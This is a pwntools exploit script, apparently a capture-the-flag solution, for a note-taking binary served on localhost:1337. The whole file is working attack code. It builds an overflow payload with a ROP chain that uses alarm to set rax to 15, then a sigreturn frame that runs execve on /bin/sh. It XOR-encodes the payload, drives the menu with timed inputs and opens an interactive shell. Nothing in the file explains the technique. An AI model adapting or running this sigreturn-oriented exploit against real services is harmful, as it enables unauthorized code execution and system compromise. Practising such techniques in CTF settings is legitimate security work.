from pwn import *
import time
elf = ELF("note_ns")

context.log_level = "debug"
context.arch = 'x86_64'
ip, port = "localhost", 1337
context.terminal = "foot"
if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(ip, port)
else:
    r = process("./notes")

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def decrypt_buffer1(ptr):
    key = "2111485077978050"
    text = ptr
    for i in range(len(text)):
        text[i] = text[i] ^ ord(key[i % 16])

alarm = p64(elf.symbols['alarm'])
read_input = p64(elf.symbols['read_input'])
bss = p64(elf.bss())
pop_rdi = p64(0x0000000000401bc0)
syscall = p64(0x0000000000401bc2)
ret = p64(0x000000000040101a)

frame = SigreturnFrame()
frame.rip = 0x0000000000401bc2
frame.rax = 0x3b
frame.rdi = elf.bss()
frame.rsi = 0x0
frame.rdx = 0x0
main = p64(elf.symbols['main'])
payload = b"A"*72  + pop_rdi + bss  + read_input
payload += pop_rdi + p64(0xf) + alarm + pop_rdi + p64(0x0) + alarm  + syscall + bytes(frame)
payload = bytearray(payload)

decrypt_buffer1(payload)

sla(": ","5")
sla("ID: ","1")
sla('Content: ',payload)

sla(': ','1')
sla('ID: ','1')
sla('Name: ','A')
sla('Size: ','10')
sla('Content: ','AA')

sleep(6)
sl('1')
sla('ID: ','1')
sla('Name: ','A')
sla('Size: ','10')
sla('Content: ','A')

sleep(4)
sla(': ','4')
sla("Size: ","1000")

sleep(5)
sl("/bin/sh\x00")

sleep(2)
sl("/bin/sh\x00")

r.interactive()